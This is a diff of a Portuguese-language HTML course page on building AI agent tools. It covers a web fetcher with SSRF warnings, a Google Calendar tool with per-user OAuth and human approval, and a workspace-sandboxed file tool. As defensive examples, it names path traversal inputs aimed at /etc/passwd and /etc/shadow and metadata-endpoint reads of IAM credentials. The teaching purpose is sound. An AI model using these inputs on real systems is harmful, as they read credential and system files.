+        ctype = r.headers.get("content-type", "").lower()
+        if "text/html" in ctype:
+            text = self._h2t.handle(r.text)
+        elif "text/" in ctype or "json" in ctype:
+            text = r.text
+        else:
+            return ToolResult(output=None,
+                              error=f"content-type não-textual: {ctype}")
+
+        return ToolResult(
+            output=text[:12000],
+            metadata={
+                "status": r.status_code,
+                "final_url": str(r.url),
+                "bytes": len(r.content),
+            },
+        )</code></pre>
+</div>
+
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-red-400 mb-3 flex items-center"><span class="mr-2">⚠️</span> SSRF — o ataque que ninguém vê chegar</h3>
+<p class="text-neutral-300 text-sm">Sem bloqueio de <code>169.254.169.254</code>, o agente consegue ler metadata da instância AWS (incluindo IAM credentials). Sem bloqueio de <code>localhost</code>, ele lê seu Redis, Postgres, painel admin interno. Block list <strong>sempre</strong>, plus DNS rebinding protection em produção séria.</p>
+</div>
+
+<div class="bg-blue-900/20 rounded-xl border border-blue-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-blue-400 mb-3 flex items-center"><span class="mr-2">📊</span> Por que User-Agent realista importa</h3>
+<ul class="space-y-2 text-neutral-300 text-sm">
+<li><strong class="text-blue-400">Cloudflare/Akamai</strong> bloqueiam UA vazio ou "python-httpx/0.27".</li>
+<li><strong class="text-blue-400">Identificação honesta:</strong> nome do produto + contato. Webmaster sabe pra quem reclamar (e não bloqueia preventivamente).</li>
+<li><strong class="text-blue-400">robots.txt:</strong> respeite. Implementação de respeito é 10 linhas e evita C&amp;D no e-mail.</li>
+</ul>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">httpx async</strong><p class="text-xs text-neutral-400 mt-1">requests bloqueia event loop, mata throughput.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">html2text</strong><p class="text-xs text-neutral-400 mt-1">5x menos tokens que HTML cru.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Truncar em 12KB</strong><p class="text-xs text-neutral-400 mt-1">~3000 tokens. Suficiente pra resumo.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">max_redirects=5</strong><p class="text-xs text-neutral-400 mt-1">Loop infinito de redirect = DoS.</p></div>
+</div>
+</section>
+
+<!-- TOPICO 4 — CalendarTool -->
+<section id="topico-4" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">4</span><h2 class="text-2xl font-bold">📅 CalendarTool — Google Calendar OAuth</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">Aqui mora dinheiro real: agente que marca reunião pro cliente, lê agenda antes de responder, agenda follow-up sozinho. OAuth refresh token guardado por user → cada operação age <em>como aquele user específico</em>. Sem isso, não tem produto B2C.</p>
+
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-6 mb-6">
+<pre class="code-box text-neutral-300 overflow-x-auto"><code>from datetime import datetime, timezone
+from google.oauth2.credentials import Credentials
+from google.auth.transport.requests import Request
 from googleapiclient.discovery import build
+from googleapiclient.errors import HttpError
+from .base import Tool, ToolResult
+
+SCOPES = ["https://www.googleapis.com/auth/calendar.events"]
 
 class CalendarTool(Tool):
-    name = "calendar_list"
-    description = "Lista eventos do dia. Use quando user pergunta sobre agenda."
-    parameters = {"type": "object", "properties": {
-        "date": {"type": "string", "description": "YYYY-MM-DD. Use today se omitido."}
-    }}
-    async def execute(self, date=None):
-        creds = Credentials.from_authorized_user_file('token.json')
-        svc = build('calendar', 'v3', credentials=creds)
-        events = svc.events().list(calendarId='primary', timeMin=...).execute()
-        return ToolResult(output="\\n".join(f"- {e['summary']} @ {e['start']}" for e in events.get('items', [])))</code></pre></div></section>
+    name = "create_calendar_event"
+    description = (
+        "Cria evento no Google Calendar primário do usuário. "
+        "Use quando o usuário pede 'agenda', 'marca', 'cria reunião'. "
+        "Datas devem estar em ISO 8601 com timezone "
+        "(ex: '2026-05-20T14:00:00-03:00'). "
+        "NÃO use para apenas listar eventos (use list_calendar_events) "
+        "nem para editar evento existente (use update_calendar_event). "
+        "Requer aprovação humana antes de gravar."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "summary": {"type": "string", "description": "Título do evento"},
+            "start_iso": {"type": "string",
+                          "description": "Início em ISO 8601 com timezone"},
+            "end_iso": {"type": "string",
+                        "description": "Fim em ISO 8601 com timezone"},
+            "description": {"type": "string",
+                            "description": "Descrição opcional"},
+            "attendees": {
+                "type": "array",
+                "items": {"type": "string", "format": "email"},
+                "description": "Lista de e-mails convidados (opcional)",
+            },
+        },
+        "required": ["summary", "start_iso", "end_iso"],
+        "additionalProperties": False,
+    }
+    requires_approval = True  # human-in-the-loop
 
-<section id="topico-5" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">5</span><h2 class="text-2xl font-bold">📝 FileTool chroot</h2></div><div class="bg-dark-800 rounded-xl border border-dark-600 p-6"><pre class="code-box text-neutral-300 overflow-x-auto"><code>from pathlib import Path
+    def __init__(self, token_store):
+        self.token_store = token_store  # injeção: lê/escreve refresh tokens
+
+    def _creds_for(self, user_id: str) -&gt; Credentials | None:
+        raw = self.token_store.get(user_id, provider="google")
+        if not raw:
+            return None
+        creds = Credentials(
+            token=raw["access_token"],
+            refresh_token=raw["refresh_token"],
+            token_uri="https://oauth2.googleapis.com/token",
+            client_id=raw["client_id"],
+            client_secret=raw["client_secret"],
+            scopes=SCOPES,
+        )
+        if creds.expired and creds.refresh_token:
+            creds.refresh(Request())
+            self.token_store.save(user_id, provider="google",
+                                  access_token=creds.token,
+                                  refresh_token=creds.refresh_token,
+                                  client_id=raw["client_id"],
+                                  client_secret=raw["client_secret"])
+        return creds
+
+    async def execute(self, session, summary: str, start_iso: str, end_iso: str,
+                      description: str = "", attendees: list[str] | None = None) -&gt; ToolResult:
+        # Validação de data antes da API
+        try:
+            start = datetime.fromisoformat(start_iso)
+            end = datetime.fromisoformat(end_iso)
+        except ValueError as e:
+            return ToolResult(output=None, error=f"data inválida: {e}")
+        if start.tzinfo is None or end.tzinfo is None:
+            return ToolResult(output=None, error="datas precisam de timezone")
+        if end &lt;= start:
+            return ToolResult(output=None, error="end_iso deve ser depois de start_iso")
+        if start &lt; datetime.now(timezone.utc):
+            return ToolResult(output=None, error="não agendamos no passado")
+
+        creds = self._creds_for(session.user.id)
+        if not creds:
+            return ToolResult(output=None,
+                              error="usuário não conectou Google Calendar. "
+                                    "Peça pra ele rodar /connect_google.")
+
+        body = {
+            "summary": summary,
+            "description": description,
+            "start": {"dateTime": start_iso},
+            "end": {"dateTime": end_iso},
+        }
+        if attendees:
+            body["attendees"] = [{"email": e} for e in attendees]
+
+        try:
+            service = build("calendar", "v3", credentials=creds,
+                            cache_discovery=False)
+            event = service.events().insert(
+                calendarId="primary", body=body, sendUpdates="all"
+            ).execute()
+        except HttpError as e:
+            return ToolResult(output=None,
+                              error=f"google api error: {e.status_code} {e.reason}")
+
+        return ToolResult(
+            output=f"Evento criado: {event['htmlLink']}",
+            metadata={"event_id": event["id"], "link": event["htmlLink"]},
+        )</code></pre>
+</div>
+
+<div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+<h3 class="text-lg font-semibold text-primary mb-3 flex items-center"><span class="mr-2">💡</span> requires_approval = True</h3>
+<p class="text-neutral-300 text-sm">Toda tool que <em>escreve</em> em sistema externo do usuário (calendar, email, banco) liga o flag. O agente loop (T2.2) intercepta antes do execute, manda mensagem "vou criar evento X em Y, confirma? (sim/não)" via channel. Sem isso, primeiro bug = e-mail enviado pro chefe errado.</p>
+</div>
+
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-red-400 mb-3 flex items-center"><span class="mr-2">⚠️</span> 3 erros que custam dinheiro</h3>
+<ul class="space-y-2 text-neutral-300 text-sm">
+<li>1. <strong>Refresh token em variável de ambiente.</strong> Funciona pra 1 user. Falha em 2. Sempre por-user, sempre em DB criptografado.</li>
+<li>2. <strong>Não refresh antes de cada chamada.</strong> Access token Google dura 1h. Sem refresh, 60% das tool calls falham aleatoriamente.</li>
+<li>3. <strong>sendUpdates="none".</strong> Convidados não recebem nada → cliente reclama que ferramenta "não funciona".</li>
+</ul>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Token por user</strong><p class="text-xs text-neutral-400 mt-1">token_store(user_id, provider).</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Validação antes da API</strong><p class="text-xs text-neutral-400 mt-1">Economiza quota e dá erro claro.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">requires_approval</strong><p class="text-xs text-neutral-400 mt-1">Write external = sempre confirma.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">HttpError captura</strong><p class="text-xs text-neutral-400 mt-1">429 (quota) ≠ 401 (token morto).</p></div>
+</div>
+</section>
+
+<!-- TOPICO 5 — FileTool -->
+<section id="topico-5" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">5</span><h2 class="text-2xl font-bold">📁 FileTool — chroot via pathlib.is_relative_to</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">Agente precisa ler e escrever arquivos. Sem isolamento, qualquer <code>path="../../etc/passwd"</code> vira incidente. Solução robusta: cada user tem <code>workspace_root</code>, todo path é resolvido e <code>is_relative_to</code> verifica que ainda está dentro. Bloqueia <code>..</code>, symlink escape, absolute path injection.</p>
+
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-6 mb-6">
+<pre class="code-box text-neutral-300 overflow-x-auto"><code>from pathlib import Path
+from .base import Tool, ToolResult
+
+MAX_WRITE_BYTES = 1_000_000   # 1MB por arquivo
+MAX_READ_BYTES  = 200_000     # 200KB lidos retornam pro LLM
+
+def _safe_resolve(workspace: Path, rel: str) -&gt; Path | None:
+    """Resolve path dentro do workspace. None se escape."""
+    try:
+        candidate = (workspace / rel).resolve()
+    except (OSError, ValueError):
+        return None
+    workspace_resolved = workspace.resolve()
+    # is_relative_to bloqueia '..' e symlinks que apontam pra fora
+    if not candidate.is_relative_to(workspace_resolved):
+        return None
+    return candidate
+
 
 class FileWriteTool(Tool):
-    def __init__(self, workspace):
-        self.workspace = Path(workspace).resolve()
+    name = "file_write"
+    description = (
+        "Escreve conteúdo textual em arquivo dentro do workspace do usuário. "
+        "Caminho sempre relativo (ex: 'notas/ideia.md', NÃO '/tmp/x' nem "
+        "'../x'). Sobrescreve se existir. Cria diretórios pais. "
+        "Limite: 1MB por chamada. Use file_append para somar a arquivo "
+        "existente sem sobrescrever."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "path": {
+                "type": "string",
+                "description": "Caminho relativo ao workspace, sem '..' nem barra inicial",
+            },
+            "content": {
+                "type": "string",
+                "description": "Conteúdo textual UTF-8. Máx 1MB.",
+            },
+        },
+        "required": ["path", "content"],
+        "additionalProperties": False,
+    }
 
-    async def execute(self, path, content):
-        target = (self.workspace / path).resolve()
-        if not target.is_relative_to(self.workspace):
-            return ToolResult(error="path fora do workspace", output=None)
-        if len(content) &gt; 100_000:
-            return ToolResult(error="conteúdo &gt; 100k chars", output=None)
-        target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text(content)
-        return ToolResult(output=f"escrito {len(content)} bytes em {path}")</code></pre></div></section>
+    async def execute(self, session, path: str, content: str) -&gt; ToolResult:
+        if path.startswith("/") or ".." in Path(path).parts:
+            return ToolResult(output=None,
+                              error="path inválido: use relativo sem '..'")
+        if len(content.encode("utf-8")) &gt; MAX_WRITE_BYTES:
+            return ToolResult(output=None,
+                              error=f"conteúdo &gt; {MAX_WRITE_BYTES} bytes")
 
-<section id="topico-6" class="mb-16"><div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">6</span><h2 class="text-2xl font-bold">📜 Padrões pra LLM entender</h2></div><div class="bg-primary/10 rounded-xl border border-primary/40 p-6"><h3 class="text-lg font-semibold text-primary mb-3 flex items-center"><span class="mr-2">💡</span> 4 regras</h3><ol class="space-y-2 text-neutral-300 text-sm list-decimal list-inside"><li>Description começa com verbo: "Roda...", "Busca...", "Cria...".</li><li>Mostre 1 exemplo quando faz sentido: "Ex: ls -la /tmp".</li><li>Diga quando NÃO usar: "Não use pra arquivos &gt; 1MB".</li><li>Parameters &lt; 7. Se passa, simplifica ou divide tool.</li></ol></div></section>
+        target = _safe_resolve(session.workspace, path)
+        if target is None:
+            return ToolResult(output=None,
+                              error="path escapou do workspace (bloqueado)")
 
-<section class="mb-12"><div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-8"><h2 class="text-2xl font-bold mb-6">📝 Resumo</h2><p class="text-neutral-300 mb-6">4 tools cobrem 80% dos casos: shell, web, calendar, file. Descrição boa = 90% accuracy do LLM.</p><div class="flex flex-col sm:flex-row gap-4"><a href="modulo-2-4.html" class="flex-1 text-center px-6 py-3 bg-dark-700 text-neutral-300 rounded-lg font-semibold hover:bg-dark-600 transition-colors">← Anterior</a><a href="modulo-2-6.html" class="flex-1 text-center px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-500 transition-colors">Próximo →</a></div></div></section>
+        try:
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_text(content, encoding="utf-8")
+        except OSError as e:
+            return ToolResult(output=None, error=f"erro de I/O: {e}")
+
+        rel = target.relative_to(session.workspace.resolve())
+        return ToolResult(
+            output=f"escrito: {rel} ({len(content)} chars)",
+            metadata={"path": str(rel), "bytes": len(content)},
+        )
+
+
+class FileReadTool(Tool):
+    name = "file_read"
+    description = (
+        "Lê conteúdo textual de arquivo no workspace. "
+        "Retorna até 200KB. Para arquivos maiores, use shell com 'head'."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "path": {"type": "string", "description": "Caminho relativo"},
+        },
+        "required": ["path"],
+        "additionalProperties": False,
+    }
+
+    async def execute(self, session, path: str) -&gt; ToolResult:
+        target = _safe_resolve(session.workspace, path)
+        if target is None:
+            return ToolResult(output=None, error="path inválido ou fora do workspace")
+        if not target.exists():
+            return ToolResult(output=None, error=f"não existe: {path}")
+        if not target.is_file():
+            return ToolResult(output=None, error=f"não é arquivo: {path}")
+        try:
+            data = target.read_bytes()
+        except OSError as e:
+            return ToolResult(output=None, error=f"I/O: {e}")
+        try:
+            text = data[:MAX_READ_BYTES].decode("utf-8")
+        except UnicodeDecodeError:
+            return ToolResult(output=None, error="arquivo binário não suportado")
+        truncated = len(data) &gt; MAX_READ_BYTES
+        return ToolResult(
+            output=text + ("\n[...truncado]" if truncated else ""),
+            metadata={"size": len(data), "truncated": truncated},
+        )</code></pre>
+</div>
+
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-red-400 mb-3 flex items-center"><span class="mr-2">🚨</span> Por que <code>is_relative_to</code> e não startswith</h3>
+<p class="text-neutral-300 text-sm">String <code>"/home/user1"</code>.startswith(<code>"/home/user"</code>) = True → acabou de vazar acesso a <code>/home/user2/...</code>. <code>is_relative_to</code> compara <em>componentes de path</em>, não substring. E <code>resolve()</code> primeiro força a expansão de symlinks. As duas juntas bloqueiam todos os ataques conhecidos de path traversal.</p>
+</div>
+
+<div class="bg-blue-900/20 rounded-xl border border-blue-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-blue-400 mb-3 flex items-center"><span class="mr-2">📊</span> Ataques que esta defesa bloqueia</h3>
+<ul class="space-y-2 text-neutral-300 text-sm">
+<li><strong class="text-blue-400">../../../etc/passwd</strong> — <code>..</code> em <code>Path.parts</code> rejeita logo no início.</li>
+<li><strong class="text-blue-400">/etc/passwd absoluto</strong> — <code>startswith("/")</code> rejeita.</li>
+<li><strong class="text-blue-400">notas/link-malicioso</strong> apontando pra <code>/etc/shadow</code> — <code>resolve()</code> segue o symlink, <code>is_relative_to</code> vê que saiu, bloqueia.</li>
+<li><strong class="text-blue-400">notas/./../../etc</strong> — <code>resolve()</code> normaliza, mesma defesa pega.</li>
+</ul>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">resolve() obrigatório</strong><p class="text-xs text-neutral-400 mt-1">Sem ele, symlink escape passa.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Limite de bytes</strong><p class="text-xs text-neutral-400 mt-1">Sem isso, agente enche disco em 1 turn.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">UTF-8 only</strong><p class="text-xs text-neutral-400 mt-1">Binário no contexto não ajuda LLM.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Workspace por user</strong><p class="text-xs text-neutral-400 mt-1"><code>/data/ws/{user_id}/</code>. Isolamento default.</p></div>
+</div>
+</section>
+
+<!-- TOPICO 6 — Padrões -->
+<section id="topico-6" class="mb-16">
+<div class="flex items-center space-x-4 mb-6"><span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">6</span><h2 class="text-2xl font-bold">🧠 Padrões que tornam tool clara pro LLM</h2></div>
+
+<p class="text-neutral-300 mb-6 leading-relaxed">Tool tecnicamente correta + description ruim = tool nunca chamada (ou chamada errado). O LLM não consulta seu README — ele lê <em>só</em> o que você expõe via schema. Tratá-lo como dev júnior recém-contratado funciona: dá exemplo, diz quando não usar, mostra formato de input.</p>
+
+<div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+<div class="bg-emerald-900/20 rounded-xl border border-emerald-500/30 p-6">
+<h4 class="font-bold text-emerald-400 mb-3">✓ Boa description</h4>
+<pre class="code-box text-xs text-neutral-300 whitespace-pre-wrap">"""Busca eventos no Google Calendar
+primário do usuário entre duas datas.
+Datas em ISO 8601 com timezone
+(ex: '2026-05-18T00:00:00-03:00').
+Retorna até 50 eventos, mais recentes
+primeiro. Use para 'o que tem hoje',
+'agenda da semana', 'reuniões com X'.
+NÃO use para criar evento
+(use create_calendar_event)."""</pre>
+</div>
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6">
+<h4 class="font-bold text-red-400 mb-3">✗ Description ruim</h4>
+<pre class="code-box text-xs text-neutral-300 whitespace-pre-wrap">"""Calendar tool."""
+
+→ LLM não sabe o que faz
+→ Chama em situações erradas
+→ Passa parâmetro em formato errado
+→ Confunde com outras tools de calendar
+→ Você gasta dias debugando "por que
+   o agente não usa minha tool nova"</pre>
+</div>
+</div>
+
+<div class="bg-blue-900/20 rounded-xl border border-blue-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-blue-400 mb-3 flex items-center"><span class="mr-2">📊</span> 8 anti-padrões comuns (e como corrigir)</h3>
+<ul class="space-y-3 text-neutral-300 text-sm">
+<li><strong class="text-blue-400">1. Nome genérico.</strong> <code>process</code>, <code>handle</code>, <code>do_it</code>. Corrija: verbo + objeto (<code>extract_invoice_total</code>).</li>
+<li><strong class="text-blue-400">2. Description sem exemplo.</strong> LLM aprende por exemplo melhor que por regra. Sempre inclua 1.</li>
+<li><strong class="text-blue-400">3. Description sem "quando NÃO usar".</strong> Tools concorrentes (ex: 3 tools de email) confundem o LLM. Diga explicitamente a diferença.</li>
+<li><strong class="text-blue-400">4. Mais de 7 parâmetros.</strong> Divida em 2 tools (ex: <code>create_event_simple</code> + <code>update_event_advanced</code>).</li>
+<li><strong class="text-blue-400">5. Parâmetros sem description.</strong> O LLM adivinha o formato e erra. Cada property leva <code>description</code> com exemplo.</li>
+<li><strong class="text-blue-400">6. Required frouxo.</strong> Tudo optional = LLM chama sem args. Marque required estrito + <code>additionalProperties: false</code>.</li>
+<li><strong class="text-blue-400">7. Output enorme.</strong> Truncar não é opcional. 4-12KB. Páginas grandes viram <code>file_write</code> + caminho devolvido.</li>
+<li><strong class="text-blue-400">8. Erros como exception.</strong> Tool nunca raise. Sempre <code>ToolResult(error="...")</code> com mensagem que o LLM consegue ler e ajustar.</li>
+</ul>
+</div>
+
+<div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+<h3 class="text-lg font-semibold text-primary mb-3 flex items-center"><span class="mr-2">💡</span> Teste empírico de description</h3>
+<p class="text-neutral-300 text-sm">Após escrever a description, rode 20 prompts mistos (alguns que <em>devem</em> chamar a tool, outros que <em>não devem</em>) contra o agente em modo dry-run. Conte: precision (% das chamadas que eram apropriadas) e recall (% dos casos onde devia chamar e chamou). Abaixo de 80/80 = reescreva a description antes de codar outra tool.</p>
+</div>
+
+<div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+<h3 class="text-lg font-semibold text-red-400 mb-3 flex items-center"><span class="mr-2">⚠️</span> Mensagem de erro fala com o LLM, não com o user</h3>
+<pre class="code-box text-xs text-neutral-300">✗ error="Internal error 0x8021"           ← LLM trava
+✗ error="Exception in module foo line 22"  ← LLM trava
+✓ error="email inválido. use formato user@dominio.com"
+✓ error="datas precisam de timezone (ex: -03:00)"
+✓ error="user não conectou Google. peça /connect_google"</pre>
+<p class="text-neutral-300 text-sm mt-3">O LLM lê a mensagem e <em>tenta de novo com a correção</em>. Mensagem útil = tool se auto-recupera. Mensagem técnica = agente desiste e responde "houve um erro" pro user.</p>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">1 tool = 1 verbo</strong><p class="text-xs text-neutral-400 mt-1">Se faz 2 coisas, são 2 tools.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Exemplo na description</strong><p class="text-xs text-neutral-400 mt-1">"Ex: pattern='*.md'" vale por 100 palavras.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Erro = ToolResult</strong><p class="text-xs text-neutral-400 mt-1">Nunca raise. Mensagem actionable.</p></div>
+<div class="bg-dark-800 rounded-xl border border-dark-600 p-4"><strong class="text-blue-400">Teste 20 prompts</strong><p class="text-xs text-neutral-400 mt-1">Precision e recall &gt; 80% antes de shippar.</p></div>
+</div>
+</section>
+
+<!-- RESUMO -->
+<section class="mb-12">
+<div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-8">
+<h2 class="text-2xl font-bold mb-6 flex items-center"><span class="mr-3">📝</span> Resumo do módulo</h2>
+<div class="space-y-4 mb-8">
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">Tool = 4 partes:</strong><span class="text-neutral-400"> name, description, parameters, execute. Mais que isso é over-engineering.</span></div></div>
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">ShellTool sem whitelist + timeout = RCE.</strong><span class="text-neutral-400"> Whitelist binário, <code>create_subprocess_exec</code>, bloqueio de metacaracteres, cwd escopado.</span></div></div>
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">WebFetch sem SSRF defense = leak de IAM credentials.</strong><span class="text-neutral-400"> Bloqueie localhost, 169.254.169.254, .internal. UA realista.</span></div></div>
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">Calendar requer OAuth por user + refresh + requires_approval.</strong><span class="text-neutral-400"> Sem isso, vira "ferramenta que funciona às vezes" — que é a pior categoria.</span></div></div>
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">FileTool com <code>resolve()</code> + <code>is_relative_to()</code>.</strong><span class="text-neutral-400"> startswith não basta — symlinks escapam.</span></div></div>
+<div class="flex items-start space-x-3"><span class="text-blue-400 mt-1">✓</span><div><strong class="text-neutral-100">Description é system prompt parcial.</strong><span class="text-neutral-400"> Exemplo + quando NÃO usar + mensagens de erro actionable. Teste com 20 prompts.</span></div></div>
+</div>
+<div class="bg-dark-800/50 rounded-lg p-4 mb-8"><h3 class="font-semibold text-blue-400 mb-2">Próximo módulo:</h3><p class="text-neutral-300">2.6 — Empacotar e operar (Docker, healthcheck, logging estruturado, deploy em VPS de R$30)</p></div>
+<div class="flex flex-col sm:flex-row gap-4">
+<a href="modulo-2-4.html" class="flex-1 text-center px-6 py-3 bg-dark-700 text-neutral-300 rounded-lg font-semibold hover:bg-dark-600 transition-colors">← Módulo anterior</a>
+<a href="modulo-2-6.html" class="flex-1 text-center px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-500 transition-colors">Próximo Módulo →</a>
+</div>
+</div>
+</section>
 
 </main>
+
 <footer class="border-t border-dark-600 py-8 mt-8"><div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-neutral-500 text-sm"><p>New Agentic OS · Trilha 2 · Módulo 2.5 · <a href="https://inema.club" target="_blank" class="text-sky-400 hover:text-sky-300">INEMA.CLUB</a></p></div></footer>
-<script>const tt=document.getElementById('theme-toggle'),td=document.getElementById('theme-toggle-dark-icon'),tl=document.getElementById('theme-toggle-light-icon'),h=document.documentElement;if(localStorage.getItem('theme')==='light'||(!localStorage.getItem('theme')&&!h.classList.contains('dark'))){td.classList.remove('hidden');h.classList.remove('dark')}else{tl.classList.remove('hidden')}tt.addEventListener('click',()=>{td.classList.toggle('hidden');tl.classList.toggle('hidden');h.classList.toggle('dark');localStorage.setItem('theme',h.classList.contains('dark')?'dark':'light')});</script>
+
+<script>
+const tt=document.getElementById('theme-toggle'),td=document.getElementById('theme-toggle-dark-icon'),tl=document.getElementById('theme-toggle-light-icon'),h=document.documentElement;
+if(localStorage.getItem('theme')==='light'||(!localStorage.getItem('theme')&&!h.classList.contains('dark'))){td.classList.remove('hidden');h.classList.remove('dark')}else{tl.classList.remove('hidden')}
+tt.addEventListener('click',()=>{td.classList.toggle('hidden');tl.classList.toggle('hidden');h.classList.toggle('dark');localStorage.setItem('theme',h.classList.contains('dark')?'dark':'light')});
+</script>
 </body></html>
